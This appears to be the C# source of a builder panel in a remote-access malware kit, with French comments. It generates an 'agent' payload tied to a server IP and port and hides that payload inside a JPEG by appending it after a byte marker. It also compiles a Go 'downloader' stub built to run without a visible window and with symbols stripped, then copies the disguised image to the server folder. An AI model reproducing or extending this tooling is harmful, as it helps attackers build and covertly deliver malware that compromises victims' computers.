using System;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;

namespace rslm_frontend.Views
{
    public partial class BuilderTerminalView : UserControl
    {
        private string _builderPath;
        private string _outputDir;
        private string _serverDir;

        public BuilderTerminalView()
        {
            InitializeComponent();
            _builderPath = @"C:\Users\Keylan\Desktop\RLSM.6.04\RSLM.Builder\bin\Release\RSLM.Builder.exe";

            // Dossier de sortie
            _outputDir = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Output");
            if (!Directory.Exists(_outputDir))
                Directory.CreateDirectory(_outputDir);

            // Dossier du serveur
            _serverDir = @"C:\Users\Keylan\Desktop\RLSM.6.04\x64\Release\";
        }

        private void AppendToTerminal(string text)
        {
            Dispatcher.Invoke(() =>
            {
                TerminalBox.AppendText(text + "\n");
                ScrollViewer.ScrollToEnd();
            });
        }

        private void CopyToServer()
        {
            try
            {
                string imgPath = Path.Combine(_outputDir, "img.jpg");

                if (File.Exists(imgPath))
                {
                    string destPath = Path.Combine(_serverDir, "img.jpg");
                    File.Copy(imgPath, destPath, true);
                    AppendToTerminal($"✅ img.jpg copié vers le serveur : {_serverDir}");
                }
                else
                {
                    AppendToTerminal($"⚠ img.jpg non trouvé dans {_outputDir}");
                }
            }
            catch (Exception ex)
            {
                AppendToTerminal($"ERREUR copie vers serveur: {ex.Message}");
            }
        }

        private void GenerateAgent_Click(object sender, RoutedEventArgs e)
        {
            string serverIp = ServerIpBox.Text;
            string serverPort = ServerPortBox.Text;

            AppendToTerminal("=== Génération de l'agent ===");
            AppendToTerminal($"IP: {serverIp}, Port: {serverPort}");
            AppendToTerminal($"Dossier de sortie: {_outputDir}");

            if (!File.Exists(_builderPath))
            {
                AppendToTerminal($"ERREUR: RSLM.Builder.exe non trouvé");
                StatusText.Text = "Erreur";
                return;
            }

            Task.Run(() => RunBuilder(serverIp, serverPort));
        }

        private void RunBuilder(string serverIp, string serverPort)
        {
            try
            {
                string updatePath = Path.Combine(_outputDir, "update.dat");

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = _builderPath,
                    Arguments = $"\"{serverIp}\" {serverPort} false false \"{updatePath}\" false false",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process process = new Process { StartInfo = psi })
                {
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    Dispatcher.Invoke(() =>
                    {
                        AppendToTerminal(output);
                        if (!string.IsNullOrEmpty(error))
                            AppendToTerminal($"ERREUR: {error}");
                    });
                }

                Dispatcher.Invoke(() =>
                {
                    if (File.Exists(updatePath))
                    {
                        AppendToTerminal($"✅ Agent généré: {updatePath}");
                        StatusText.Text = "Agent généré";
                    }
                    else
                    {
                        AppendToTerminal("❌ Échec de génération");
                        StatusText.Text = "Erreur";
                    }
                });
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() => AppendToTerminal($"ERREUR: {ex.Message}"));
            }
        }

        private void GenerateStub_Click(object sender, RoutedEventArgs e)
        {
            string serverIp = ServerIpBox.Text;
            string updatePath = Path.Combine(_outputDir, "update.dat");

            AppendToTerminal("\n=== Génération du stub ===");
            AppendToTerminal($"Dossier de sortie: {_outputDir}");

            if (!File.Exists(updatePath))
            {
                AppendToTerminal("ERREUR: update.dat non trouvé. Générez d'abord l'agent.");
                StatusText.Text = "Erreur";
                return;
            }

            if (!File.Exists("cat.jpg"))
            {
                AppendToTerminal("ERREUR: cat.jpg non trouvé. Placez une image dans le dossier.");
                StatusText.Text = "Erreur";
                return;
            }

            Task.Run(() => RunStubGenerator(serverIp));
        }

        private void RunStubGenerator(string serverIp)
        {
            try
            {
                string updatePath = Path.Combine(_outputDir, "update.dat");
                string imgPath = Path.Combine(_outputDir, "img.jpg");
                string stubPath = Path.Combine(_outputDir, "stub.exe");

                Dispatcher.Invoke(() => AppendToTerminal("Création de img.jpg..."));

                byte[] cat = File.ReadAllBytes("cat.jpg");
                byte[] agent = File.ReadAllBytes(updatePath);
                byte[] marker = { 0xAA, 0xAA, 0xAA };

                byte[] img = new byte[cat.Length + marker.Length + agent.Length];
                Buffer.BlockCopy(cat, 0, img, 0, cat.Length);
                Buffer.BlockCopy(marker, 0, img, cat.Length, marker.Length);
                Buffer.BlockCopy(agent, 0, img, cat.Length + marker.Length, agent.Length);

                File.WriteAllBytes(imgPath, img);
                Dispatcher.Invoke(() => AppendToTerminal($"✅ img.jpg créé dans {_outputDir}"));

                Dispatcher.Invoke(() => AppendToTerminal("Vérification de Go..."));
                try
                {
                    Process p = Process.Start(new ProcessStartInfo { FileName = "go", Arguments = "version", UseShellExecute = false, CreateNoWindow = true });
                    p.WaitForExit(1000);
                    if (p.ExitCode != 0) throw new Exception();
                }
                catch
                {
                    Dispatcher.Invoke(() => AppendToTerminal("❌ Go n'est pas installé. Télécharge-le sur https://go.dev/dl/"));
                    Dispatcher.Invoke(() => StatusText.Text = "Erreur: Go non installé");
                    return;
                }
                Dispatcher.Invoke(() => AppendToTerminal("✅ Go trouvé"));

                string goFile = "";
                if (File.Exists("go\\downloader.go")) goFile = "go\\downloader.go";
                else if (File.Exists("Ressource\\go\\downloader.go")) goFile = "Ressource\\go\\downloader.go";
                else if (File.Exists("..\\go\\downloader.go")) goFile = "..\\go\\downloader.go";

                if (string.IsNullOrEmpty(goFile))
                {
                    Dispatcher.Invoke(() => AppendToTerminal("❌ downloader.go non trouvé"));
                    return;
                }

                string code = File.ReadAllText(goFile);
                code = code.Replace("{IP}", serverIp);
                code = code.Replace("{PORT}", "8080");

                string tempFile = Path.GetTempFileName() + ".go";
                File.WriteAllText(tempFile, code);

                Dispatcher.Invoke(() => AppendToTerminal("Compilation de stub.exe..."));
                ProcessStartInfo build = new ProcessStartInfo
                {
                    FileName = "go",
                    Arguments = $"build -ldflags=\"-H windowsgui -s -w\" -o \"{stubPath}\" \"{tempFile}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process p = Process.Start(build))
                {
                    string error = p.StandardError.ReadToEnd();
                    p.WaitForExit();

                    if (File.Exists(stubPath))
                    {
                        Dispatcher.Invoke(() => AppendToTerminal($"✅ stub.exe généré dans {_outputDir}"));
                        Dispatcher.Invoke(() => StatusText.Text = "Stub généré");
                    }
                    else
                    {
                        Dispatcher.Invoke(() => AppendToTerminal($"❌ Échec: {error}"));
                        Dispatcher.Invoke(() => StatusText.Text = "Erreur");
                    }
                }

                File.Delete(tempFile);

                // Copier automatiquement img.jpg vers le serveur
                CopyToServer();
            }
            catch (Exception ex)
            {
                Dispatcher.Invoke(() => AppendToTerminal($"ERREUR: {ex.Message}"));
            }
        }

        private void ClearTerminal_Click(object sender, RoutedEventArgs e)
        {
            TerminalBox.Clear();
            StatusText.Text = "Ready";
        }
    }
}